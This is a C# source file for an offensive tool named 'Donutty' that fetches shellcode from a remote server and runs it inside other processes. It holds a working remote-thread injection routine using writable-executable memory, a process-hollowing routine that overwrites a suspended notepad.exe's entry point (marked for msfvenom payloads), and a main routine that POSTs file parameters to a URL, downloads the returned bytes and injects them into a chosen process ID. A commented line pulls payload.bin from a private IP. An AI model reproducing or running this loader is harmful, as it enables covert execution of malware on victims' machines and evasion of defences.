using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net;
using System.IO;
using System.Net.Http;

namespace Donutty
{

    class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
           string lpApplicationName,
           string lpCommandLine,
           IntPtr lpProcessAttributes,
           IntPtr lpThreadAttributes,
           bool bInheritHandles,
           uint dwCreationFlags,
           IntPtr lpEnvironment,
           string lpCurrentDirectory,
           [In] ref STARTUPINFO lpStartupInfo,
           out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(
            IntPtr hProcess,
            int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen,
            ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
            IntPtr hProcess, IntPtr lpBaseAddress,
            byte[] lpBuffer,
            Int32 nSize,
            out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        static void help()
        {
            Console.WriteLine("[-] Usage: Donutty.exe /f:<filename> /params:\"args here\" /a:<archnumber> /url:\"http://url\" /pid:<pid>");
        }

        static void inject(byte[] buf, int PID)
        {

            IntPtr output;
            IntPtr ProcessHandle = OpenProcess(0x001F0FFF, false, PID);
            IntPtr ProcessAddress = VirtualAllocEx(ProcessHandle, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
            WriteProcessMemory(ProcessHandle, ProcessAddress, buf, buf.Length, out output);
            CreateRemoteThread(ProcessHandle, IntPtr.Zero, 0, ProcessAddress, IntPtr.Zero, 0, IntPtr.Zero);


        }
            static void hollow(byte[] buf)
        {

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool res = CreateProcess(null, "C:\\Windows\\System32\\notepad.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi); //Suspended process
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();

            uint tmp = 0;
            IntPtr hProcess = pi.hProcess; //grab the handle to process
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp); //query info. 6 because the struct (bi) is 6 IntPtrs. 0 because we want PEB. This writes to bi
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10); //now bi has PEB addr, we can find image base by the value of the addr 10 bytes adjacent

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead); //Read first 8 bytes (address of the base image), save data to the addrBuf. This is the value of the 0x10 thing that has the base addr of the executable in memory.

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0)); //Converting that 8 byte address to a 64 bit number, then turn to pointer
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead); //Read the first 0x200 bytes of the executable in memory

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C); //read the e_lfanew to grab the offset between the PE header and executable memory base
            uint opthdr = e_lfanew_offset + 0x28; //Add 0x28 to that offset to get the RVA address
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr); //value of the RVA (an offset)
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase); //Add the RVA value (offset) to the base address of the executable memory

            //msfvenom

            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
            ResumeThread(pi.hThread);

        }
        static void Main(string[] args)
        {
            var arguments = new Dictionary<string, string>();
            foreach (var argument in args)
            {
                var idx = argument.IndexOf(':');
                if (idx > 0)
                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                else
                    arguments[argument] = string.Empty;
            }

            if (arguments.Count == 0)
            {
                Console.WriteLine("[-] No arguments specified. Please refer the help section for more details.");
                help();
                return;
            }
            else if (arguments.ContainsKey("/help"))
            {
                help();
                return;
            }
            string file = arguments["/f"];
            string parameters = arguments["/params"];
            string arch = arguments["/a"];
            string url = arguments["/url"];
            int PID = Int32.Parse(arguments["/pid"]);
            Console.WriteLine(args[2]);
            Console.WriteLine(arguments["/params"]);
            #region Web request

            WebClient wc = new WebClient();
            var httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
            httpWebRequest.ContentType = "application/json";
            httpWebRequest.Method = "POST";
            using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
            {
                string json = "{\"file\":" + String.Format("\"{0}\",", file) +
                              String.Format("\"arch\":\"{0}\",", arch) +
                              String.Format("\"args\":\"{0}\"", parameters) + "}";

                streamWriter.Write(json);
            }


            var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
            using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
            {
                var result = streamReader.ReadToEnd();
            }
            
            //byte[] buf = wc.DownloadData("http://10.0.0.86:8000/payload.bin");
            byte[] memBuf = wc.DownloadData(url);
            byte[] buf = memBuf;
            inject(buf, PID);
            #endregion
            
        }
    }
}
